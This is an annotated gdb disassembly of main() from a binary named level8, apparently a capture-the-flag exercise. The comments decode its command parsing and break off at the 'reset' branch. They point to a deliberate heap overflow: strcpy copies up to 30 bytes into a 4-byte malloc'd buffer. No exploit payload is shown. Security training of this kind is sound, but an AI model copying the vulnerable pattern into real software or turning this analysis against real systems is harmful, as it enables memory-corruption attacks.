gdb /home/user/level8/level8

set disassembly-flavor intel

disas main
Dump of assembler code for function main:
   0x08048564 <+0>:	    push   ebp
   0x08048565 <+1>:	    mov    ebp,esp
   0x08048567 <+3>:	    push   edi
   0x08048568 <+4>:	    push   esi
   0x08048569 <+5>:	    and    esp,0xfffffff0
   0x0804856c <+8>:	    sub    esp,0xa0
   0x08048572 <+14>:	jmp    0x8048575 <main+17>
   0x08048574 <+16>:	nop
   
   0x08048575 <+17>:	mov    ecx,DWORD PTR ds:0x8049ab0                   ; service
   0x0804857b <+23>:	mov    edx,DWORD PTR ds:0x8049aac                   ; auth
   0x08048581 <+29>:	mov    eax,0x8048810
   0x08048586 <+34>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804858a <+38>:	mov    DWORD PTR [esp+0x4],edx
   0x0804858e <+42>:	mov    DWORD PTR [esp],eax
   0x08048591 <+45>:	call   0x8048410 <printf@plt>                       ; printf("%p, %p \n", auth, service)

   0x08048596 <+50>:	mov    eax,ds:0x8049a80
   0x0804859b <+55>:	mov    DWORD PTR [esp+0x8],eax
   0x0804859f <+59>:	mov    DWORD PTR [esp+0x4],0x80
   0x080485a7 <+67>:	lea    eax,[esp+0x20]
   0x080485ab <+71>:	mov    DWORD PTR [esp],eax
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>                        ; fgets(buffer, 128, stdin)
   0x080485b3 <+79>:	test   eax,eax
   0x080485b5 <+81>:	je     0x804872c <main+456>                         ; jump if fgets(buffer, 128, stdin) == 0

   0x080485bb <+87>:	lea    eax,[esp+0x20]
   0x080485bf <+91>:	mov    edx,eax
   0x080485c1 <+93>:	mov    eax,0x8048819                                ; "auth "
   0x080485c6 <+98>:	mov    ecx,0x5
   0x080485cb <+103>:	mov    esi,edx
   0x080485cd <+105>:	mov    edi,eax
   0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]

   0x080485d1 <+109>:	seta   dl
   0x080485d4 <+112>:	setb   al
   0x080485d7 <+115>:	mov    ecx,edx
   0x080485d9 <+117>:	sub    cl,al
   0x080485db <+119>:	mov    eax,ecx
   0x080485dd <+121>:	movsx  eax,al
   0x080485e0 <+124>:	test   eax,eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>

   0x080485e4 <+128>:	mov    DWORD PTR [esp],0x4
   0x080485eb <+135>:	call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:	mov    ds:0x8049aac,eax                              ; auth = malloc(4)
   0x080485f5 <+145>:	mov    eax,ds:0x8049aac
   0x080485fa <+150>:	mov    DWORD PTR [eax],0x0                           ; auth[0] = '\0'

   0x08048600 <+156>:	lea    eax,[esp+0x20]
   0x08048604 <+160>:	add    eax,0x5
   0x08048607 <+163>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x0804860f <+171>:	mov    edx,eax
   0x08048611 <+173>:	mov    eax,0x0
   0x08048616 <+178>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x0804861a <+182>:	mov    edi,edx
   0x0804861c <+184>:	repnz scas al,BYTE PTR es:[edi]

   0x0804861e <+186>:	mov    eax,ecx
   0x08048620 <+188>:	not    eax
   0x08048622 <+190>:	sub    eax,0x1
   0x08048625 <+193>:	cmp    eax,0x1e
   0x08048628 <+196>:	ja     0x8048642 <main+222>                         jump if eax > 30

   0x0804862a <+198>:	lea    eax,[esp+0x20]
   0x0804862e <+202>:	lea    edx,[eax+0x5]
   0x08048631 <+205>:	mov    eax,ds:0x8049aac
   0x08048636 <+210>:	mov    DWORD PTR [esp+0x4],edx
   0x0804863a <+214>:	mov    DWORD PTR [esp],eax
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>                        ; strcpy()
   
   0x08048642 <+222>:	lea    eax,[esp+0x20]
   0x08048646 <+226>:	mov    edx,eax
   0x08048648 <+228>:	mov    eax,0x804881f                                 ; "reset"
   0x0804864d <+233>:	mov    ecx,0x5
